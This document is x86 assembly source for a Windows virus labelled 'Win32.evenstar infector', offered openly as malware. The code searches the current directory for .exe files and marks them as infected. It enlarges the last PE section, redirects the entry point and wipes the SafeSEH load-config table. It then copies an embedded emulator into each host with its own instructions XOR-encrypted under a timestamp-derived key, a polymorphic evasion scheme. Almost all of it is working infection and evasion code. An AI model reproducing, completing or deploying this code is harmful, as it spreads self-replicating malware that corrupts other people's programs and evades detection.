;:==============================================================================;
;:
;:
;: Win32.evenstar infector
;:
;:
;:==============================================================================;


EP_STACK_SIZE equ 128
iop     equ dd 90900b0fh

;:==============================================================================;
;:  Local Variables                                                             ;
;:==============================================================================;
ep_hFile                        equ [ebp - 4]
ep_filesize                     equ [ebp - 8]
ep_filebuffer                   equ [ebp - 12]
ep_ntheader                     equ [ebp - 16]
ep_lastseg                      equ [ebp - 20]
ep_lastseg_old_sizeofrawdata    equ [ebp - 24]
ep_end_of_copied_emu            equ [ebp - 28]
ep_workingbuffer                equ [ebp - 32]
ep_host_vm_base                 equ [ebp - 36]
ep_delta_addr                   equ [ebp - 40]
ep_key                          equ [ebp - 44]
ep_inst_ptr                     equ [ebp - 48]
ep_total_insts                  equ [ebp - 52]
ep_remote_vm_base               equ [ebp - 56]
ep_oep                          equ [ebp - 60]
ep_win32finddata                equ [ebp - 104]
ep_findhandle                   equ [ebp - 108]
ep_filenamestring               equ [ebp - 112]
ep_host_oep                     equ [ebp - 116]

;:==============================================================================;
;:  Entry point of evenstar
;:==============================================================================;
payload:
;   evenstar
    mov     eax, 0ffeeffeeh
    nop
    call    ep_delta
ep_delta:
    pop     ebx
    push    ebp
    mov     ebp, esp
    sub     esp, EP_STACK_SIZE

    mov     ecx, EP_STACK_SIZE
    mov     edi, esp
    mov     al, 0ffh
    rep     stosb
    sub     ebx, 11
    mov     ep_delta_addr, ebx

;:==============================================================================;
;:  Get API                                                                     ;
;:==============================================================================;
    mov     eax, VM_INFO_GET_API
    call    eax
    mov     esi, eax
    lea     edi, ep_findnextfile
    mov     ecx, 40
    cld
    rep     movsb
    mov     eax, ep_findfirstfile
    mov     ebx, ep_createfile
    mov     ecx, ep_findnextfile

ep_closehandle                  equ [ebp - 64]
ep_createfile                   equ [ebp - 68]
ep_getfilesize                  equ [ebp - 72]
ep_readfile                     equ [ebp - 76]
ep_virtualalloc                 equ [ebp - 80]
ep_virtualprotect               equ [ebp - 84]
ep_writefile                    equ [ebp - 88]
ep_getcurrdir                   equ [ebp - 92]
ep_findfirstfile                equ [ebp - 96]
ep_findnextfile                 equ [ebp - 100]


;:==============================================================================;
;:  Spreader                                                                    ;
;:==============================================================================;
;   FindFirstFile
;   Allocate some memory for WIN32_FIND_DATA
    push    PAGE_READWRITE
    push    MEM_COMMIT
    push    1000h
    push    NULL
    mov     eax, ep_virtualalloc
    call    eax
    mov     ep_win32finddata, eax

;   Call to FindFirstFile
    push    002a2e2ah
    mov     ebx, esp

    push    eax
    push    ebx
    mov     eax, ep_findfirstfile
    call    eax
    mov     ep_findhandle, eax
    add     esp, 4

;   ..
    call    ep_zero_win32finddata
    push    ep_win32finddata
    push    ep_findhandle
    mov     eax, ep_findnextfile
    call    eax
    mov     eax, ep_win32finddata

;:==============================================================================;
;:  Go to next file                                                             ;
;:==============================================================================;
@ep_enum_files:
;   Find next file
    call    ep_zero_win32finddata
    push    ep_win32finddata
    push    ep_findhandle
    mov     eax, ep_findnextfile
    call    eax
    test    eax, eax
    je      ep_end

;   Get filename
    mov     ebx, ep_win32finddata
    assume  ebx:ptr WIN32_FIND_DATA
    lea     eax, [ebx].cFileName
    assume  ebx:nothing

;   Test exe extension
;   Shift to end of string
    mov     edi, eax
    mov     ep_filenamestring, eax
    xor     al, al
    repne   scasb
    mov     eax, [edi - 4]
    cmp     eax, 00657865h                              ; exe\0
    jne     @ep_enum_files

;:==============================================================================;
;:  Read program into memory                                                    ;
;:==============================================================================;
    push    NULL
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_ALWAYS
    push    NULL
    push    0
    push    GENERIC_READ
    push    ep_filenamestring
    mov     eax, ep_createfile
    call    eax
    test    eax, eax
    je      @ep_enum_files
    mov     ep_hFile, eax

;   Get file size
    push    NULL
    push    eax
    mov     eax, ep_getfilesize
    call    eax
    mov     ep_filesize, eax

;   Allocate memory for file
    push    PAGE_READWRITE
    push    MEM_COMMIT
    add     eax, 1000h
    push    eax
    push    NULL
    mov     eax, ep_virtualalloc
    call    eax
    mov     ep_filebuffer, eax

;   Allocate working page
    push    PAGE_READWRITE
    push    MEM_COMMIT
    add     eax, 1000h
    push    eax
    push    NULL
    mov     eax, ep_virtualalloc
    call    eax
    mov     ep_workingbuffer, eax

;   Read file into memory
    push    NULL
    mov     ebx, esp

    push    NULL
    push    ebx
    push    ep_filesize
    push    ep_filebuffer
    push    ep_hFile
    mov     eax, ep_readfile
    call    eax   
    pop     ebx


;   Close file 
    push    ep_hFile
    mov     eax, ep_closehandle
    call    eax
    mov     ebx, ep_filebuffer


;:==============================================================================;
;:  Test headers                                                                ;
;:==============================================================================;
;   Is this file already infected?
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     WORD PTR ax, [ebx].e_oemid
    mov     edx, ep_win32finddata
    cmp     WORD PTR ax, 0eeeeh
    je      @ep_enum_files
    
    mov     eax, [ebx].e_lfanew
    assume  ebx:nothing
    add     ebx, eax
    mov     ep_ntheader, ebx

;:==============================================================================;
;:  Modify headers
;:==============================================================================;
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     eax, [ebx].OptionalHeader.SizeOfImage
    add     eax, 1000h
    mov     [ebx].OptionalHeader.SizeOfImage, eax

;   Get address of last segment
    mov     eax, SIZEOF IMAGE_SECTION_HEADER
    xor     edx, edx
    mov     WORD PTR dx, [ebx].FileHeader.NumberOfSections
    dec     dl
    mul     edx
    assume  ebx:nothing
    lea     ebx, [ebx + eax + 0f8h]
    mov     ep_lastseg, ebx

;   Expand last section
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     eax, [ebx].SizeOfRawData
    mov     ep_lastseg_old_sizeofrawdata, eax
    add     eax, 1000h
    mov     [ebx].SizeOfRawData, eax
    mov     eax, [ebx].Characteristics
    or      eax, IMAGE_SCN_MEM_WRITE
    mov     [ebx].Characteristics, eax
    assume  ebx:nothing
    mov     eax, [ebx + 08h]                            ; VirtualSize
    add     eax, 1000h
    mov     [ebx + 08h], eax

;   Change OEP
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     eax, [ebx].SizeOfRawData
    add     eax, [ebx].VirtualAddress
    sub     eax, 1000h
    assume  ebx:nothing
    mov     ebx, ep_ntheader
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     edx, [ebx].OptionalHeader.ImageBase
    add     edx, [ebx].OptionalHeader.AddressOfEntryPoint
    mov     [ebx].OptionalHeader.AddressOfEntryPoint, eax
    mov     ebx, ep_filebuffer
    assume  ebx:nothing
    mov     ep_host_oep, edx

;   Remove SafeSeh tables, if required
    pusha
    mov     ebx, ep_ntheader
    assume  ebx:ptr IMAGE_NT_HEADERS
    lea     eax, [ebx].OptionalHeader.DataDirectory
    add     eax, 80                                     ; Load Config Table VirtualAddress
    mov     edi, eax
    mov     eax, [edi]                                  ; Load virtualaddress
    test    eax, eax
    je      ep_no_load_config

;   Get size of table
    mov     ecx, [edi + 4]                              ; Size of table

;   Find executable section
    assume  ebx:nothing
    add     ebx, 0f8h
    assume  ebx:ptr IMAGE_SECTION_HEADER
    sub     eax, [ebx].VirtualAddress
    add     eax, ep_filebuffer
    add     eax, [ebx].PointerToRawData                 ; Absolute raw address at eax
    mov     edi, eax
    xor     al, al
    rep     stosb

    assume  ebx:nothing
ep_no_load_config:
    popa

;   Stamp sig
ep_image_ok:
    ;mov     eax, 0deadbeefh

;:==============================================================================;
;:  Infect                                                                      ;
;:==============================================================================;
    call    ep_infect
    

;   Open file for writing
;   Open target      
    push    NULL
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_ALWAYS
    push    NULL
    push    0
    push    GENERIC_WRITE
    push    ep_filenamestring
    mov     eax, ep_createfile
    call    eax
    test    eax, eax
    je      @ep_enum_files
    mov     ep_hFile, eax

;   Write to file
    push    NULL
    mov     eax, esp

    push    NULL
    push    eax
    mov     eax, ep_filesize
    add     eax, 1000h
    push    eax
    push    ep_filebuffer
    push    ep_hFile
    mov     eax, ep_writefile
    call    eax
    pop     eax

;   Close file
    push    ep_hFile
    mov     eax, ep_closehandle
    call    eax

    jmp     @ep_enum_files

;:==============================================================================;
;:  Return to host OEP                                                          ;
;:==============================================================================;
ep_end:
    mov     ebx, ep_oep

    add     esp, EP_STACK_SIZE
    pop     ebp

    mov     eax, VM_RETURN_TO_OEP
    call    eax














;:==============================================================================;
;:  Infect                                                                      ;
;:==============================================================================;
ep_infect:
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     ax, 0eeeeh
    mov     WORD PTR [ebx].e_oemid, ax

;   Stamp host oep
    lea     eax, [ebx].e_ip
    mov     edi, ep_oep
    sub     edi, esi
    mov     [eax], edi

;:==============================================================================;
;:  Copy emulator                                                               ;
;:==============================================================================;
    mov     ebx, ep_lastseg
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     edi, ep_filebuffer
    add     edi, ep_lastseg_old_sizeofrawdata
    add     edi, [ebx].PointerToRawData
    mov     ep_remote_vm_base, edi
    assume  ebx:nothing 
    mov     eax, VM_GET_INFO_MACHINE                    ; Calling this will get the emu to return its own location in memory
    call    eax
    mov     esi, eax
    mov     ep_host_vm_base, eax
    mov     ecx, ((OFFSET vm_end - OFFSET vm_intro) + 8)
    cld     
    push    edi                                         ; Source of vm remote
    rep     movsb                                       ; Copy the emulator
    pop     ebx
    mov     eax, ep_host_oep
    mov     [ebx + 7], eax
    sub     edi, 8
    mov     ep_end_of_copied_emu, edi                   ; Commit

;   Generate key
    pusha
    rdtsc
    mov     ebx, eax
    mov     ecx, eax
    shr     ecx, 24
@ep_key:    
    nop
    dec     cl
    cmp     cl, 0
    jne     @ep_key
    rdtsc   
    xor     eax, ebx
    ;mov     eax, 0                                      ; Override
    mov     ep_key, eax

;   Copy instruction length counter
    mov     esi, ep_host_vm_base
    lea     esi, [esi + 8 + (OFFSET vm_end - OFFSET vm_intro)]
    push    esi
    mov     edi, ep_end_of_copied_emu
    lea     edi, [edi + 8]
    mov     ecx, [esi - 4]                              ; Total amount of instructions
    mov     ep_total_insts, ecx
    rep     movsb

;   Prepare for copying payload   
    mov     DWORD PTR [edi], 0deadbeefh
    add     edi, 4
    add     esi, 4                                      ; esi now points to local payload
    mov     edx, ep_host_vm_base
    lea     edx, [edx + ((OFFSET vm_end - OFFSET vm_intro) + 8)]
    xchg    edx, esi
    mov     edx, ep_delta_addr
    
;   esi = instruction length counter, edi = remote payload, edx = host payload
@ep_copy:

;   Get length of local payload
    xor     eax, eax
    lodsb
    push    eax

;   Copy instruction to working buffer
    mov     ecx, eax
    mov     ebx, ep_workingbuffer
@ep_copy_to_work_buffer:
    mov     BYTE PTR al, [edx]                          ; Copy one byte of instruction into buffer
    mov     BYTE PTR [ebx], al
    inc     edx
    inc     ebx
    dec     ecx
    test    ecx, ecx
    jne     @ep_copy_to_work_buffer  

;   Encrypt instruction
    pop     ecx
    pusha
    and     ebx, 0ffff0000h
    mov     esi, ebx
    mov     edx, ep_key                                 ; Encryption key
@ep_enc:
    test    edx, edx
    jne     ep_enc_1
    mov     edx, ep_key
ep_enc_1:
    lodsb                                               ; Load instruction byte
    xor     al, dl
    mov     BYTE PTR [esi - 1], al
    shr     edx, 8
    dec     ecx
    test    ecx, ecx
    jne     @ep_enc
    popa

;   Copy from working buffer to remote host
    and     ebx, 0ffff0000h                             ; Set working buffer to byte 0, (beginning of encrypted inst)
    xchg    esi, ebx
    rep     movsb                                       ; Copy instruction
    xchg    ebx, esi
    mov     ecx, ep_total_insts
    dec     ecx
    mov     ep_total_insts, ecx
    test    ecx, ecx
    jne     @ep_copy

;   Stamp key into emulator
    mov     ebx, ep_remote_vm_base
    lea     ebx, [ebx + 1 + (OFFSET vm_dec_key - OFFSET vm_intro)]
    mov     eax, ep_key
    mov     [ebx], eax
    add     esp, 36

    ret






ep_zero_win32finddata:
    pusha
    mov     edi, ep_win32finddata
    mov     ecx, 1000h
    xor     al, al
    rep     stosb
    popa
    ret

    nop
    nop
    nop
    nop
payload_end: